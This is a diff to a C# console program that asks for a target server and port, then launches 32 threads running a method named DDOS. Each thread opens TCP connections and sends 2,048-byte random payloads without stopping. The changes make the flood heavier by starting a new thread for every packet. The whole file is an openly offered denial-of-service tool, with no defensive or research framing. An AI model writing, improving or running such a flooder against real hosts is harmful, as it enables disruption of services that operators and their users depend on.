@@ -3,14 +3,18 @@ using System.Text;
 using System.Net;
 using System.Net.Sockets;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Text.RegularExpressions;
+using System.Security.Cryptography;
 
 class Program
 {
-    public static string IP;
+    public static string? IP;
     public static int Port;
     public static int count = 0;
-    static void Main()
+    public static int isErr = 0;
+    public static Socket? socket;
+    static async Task Main()
     {
         Console.Clear();
         Console.Write("服务器 |  Server: ");
@@ -19,8 +23,8 @@ class Program
         Regex ymregex = new Regex(DomainPattern);
         while (!isDomainName)
         {
-            Program.IP = Console.ReadLine();
-            isDomainName = ymregex.IsMatch(Program.IP);
+            IP = Console.ReadLine();
+            isDomainName = ymregex.IsMatch(IP);
             if (!isDomainName)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
@@ -31,7 +35,7 @@ class Program
         while (true)
         {
             Console.Write("端口   |  Port  : ");
-            if (int.TryParse(Console.ReadLine(), out Program.Port))
+            if (int.TryParse(Console.ReadLine(), out Port))
             {
                 break;
             }
@@ -44,59 +48,59 @@ class Program
         }
         for (int i = 0; i < 32; i++)
         {
-            Thread t = new Thread(DDOS);
+            Thread t = new(DDOS);
             t.Start();
         }
     }
     static void DDOS()
     {
-        reclient:
-        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-        try
-        {
-            socket.Connect(Program.IP, Program.Port);
-            Console.WriteLine("连接成功 | Connect success.");
-        }
-        catch (Exception e)
-        {
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("错误: ERROR:\u0020" + e);
-            Console.ResetColor();
-        }
-        string randomString = GenerateRandomString(2048);
-        byte[] data = Encoding.UTF8.GetBytes(randomString);
+    reclient:
+        socket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+        socket.Connect(IP, Port);
         while (true)
         {
-            Program.count++;
-            try
-            {
-                socket.Send(data);
-                Console.Clear();
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.Write("OK");
-                Console.ResetColor();
-                Console.Write("\u0020time ="+Program.count);
-            }
-            catch (Exception e)
+            count++;
+
+            Thread s = new(SendPackage);
+            s.Start();
+            Console.Clear();
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.Write("OK");
+            Console.ResetColor();
+            Console.Write("\u0020time ="+ count);
+
+            if(isErr == 1)
             {
                 Console.Clear();
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.Write("错误: ERROR At\u0020" + Program.count + "\u0020turns. Message:\u0020" + e.Message);
+                Console.Write("错误: ERROR At\u0020" + count + "\u0020turns.");
                 Console.ResetColor();
-                socket.Shutdown(SocketShutdown.Receive);
                 goto reclient;
             }
         }
     }
-    static string GenerateRandomString(int sizeInBytes)
+    static void SendPackage()
     {
+        int rs = 2048;
         const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
-        StringBuilder rd = new StringBuilder(sizeInBytes);
-        Random random = new Random();
-        for (int i = 0; i < sizeInBytes; i++)
+        StringBuilder rd = new(rs);
+        Random random = new();
+        for (int i = 0; i < rs; i++)
         {
             rd.Append(chars[random.Next(chars.Length)]);
         }
-        return rd.ToString();
+        byte[] data = Encoding.UTF8.GetBytes(rd.ToString());
+
+        try
+        {
+            socket.Send(data);
+            isErr = 0;
+            return;
+        }
+        catch(Exception)
+        {
+            isErr = 1;
+            return;
+        }
     }
 }
